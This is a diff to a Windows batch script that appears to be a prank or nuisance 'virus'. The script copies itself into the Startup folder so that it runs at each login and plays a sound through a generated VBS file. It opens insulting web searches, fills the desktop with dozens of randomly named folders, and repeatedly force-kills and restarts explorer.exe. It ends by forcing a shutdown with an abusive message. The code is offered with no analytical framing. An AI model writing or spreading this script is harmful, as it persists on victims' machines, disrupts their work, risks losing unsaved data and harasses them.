@@ -32,6 +32,7 @@ copy run.vbs "%userprofile%\Start Menu\Programs\Startup"
 copy UnrealV4.bat "%userprofile%\Start Menu\Programs\Startup"
 
 
+ping localhost -n 15 >NUL
 
 set "file=jebaited.mp3"
 ( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
@@ -44,7 +45,26 @@ set "file=jebaited.mp3"
   ping localhost -n 2 >NUL
 start /min sound.vbs
 
+start index.html
+
+ping localhost -n 7 >NUL
+
+start https://www.google.com/search?q=How+do+I+remove+a+virus?
+
+ping localhost -n 10 >NUL
+
+start https://www.google.com/search?q=Are+my+mousebuttons+swapped?+~yes
+
+ping localhost -n 4
+
+start https://www.google.com/search?q=GET+DESTROYED+BITCH!+HAHAHA
+
 start runerrors.vbs
+
+start explorer.exe
+
+ping localhost -n 2 >NUL
+start notepad.exe
 
 cd "%userprofile%/Desktop"
 
@@ -68,23 +88,59 @@ md %userprofile%\Desktop HACKED17
 md %userprofile%\Desktop HACKED18
 md %userprofile%\Desktop HACKED19
 md %userprofile%\Desktop HACKED20
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
+md %userprofile%\Desktop %random%
 
-taskkill /F /IM explorer.exe
-ping localhost -n 2 >NUL
-start explorer.exe
-ping localhost -n 2 >NUL
-taskkill /F /IM explorer.exe
-ping localhost -n 2 >NUL
-start explorer.exe
-ping localhost -n 2 >NUL
-taskkill /F /IM explorer.exe
-ping localhost -n 2 >NUL
-start explorer.exe
-ping localhost -n 2 >NUL
-taskkill /F /IM explorer.exe
-ping localhost -n 2 >NUL
-start explorer.exe
 
-shutdown -s -t 3 -c "Bye Bye Bitch! HAHAHAAHAHAH"
+start cmd.exe
+ping localhost -n 5 >NUL
+taskkill /F /IM explorer.exe
+ping localhost -n 2 >NUL
+start explorer.exe
+ping localhost -n 4 >NUL
+taskkill /F /IM explorer.exe
+ping localhost -n 2 >NUL
+start explorer.exe
+ping localhost -n 4 >NUL
+taskkill /F /IM explorer.exe
+ping localhost -n 2 >NUL
+start explorer.exe
+ping localhost -n 4 >NUL
+taskkill /F /IM explorer.exe
+ping localhost -n 2 >NUL
+start explorer.exe
+ping localhost -n 4 >NUL
+taskkill /F /IM explorer.exe
+
+
+shutdown -s -t 4 -c "Bye Bye Bitch! HAHAHAAHAHAH"
 
 
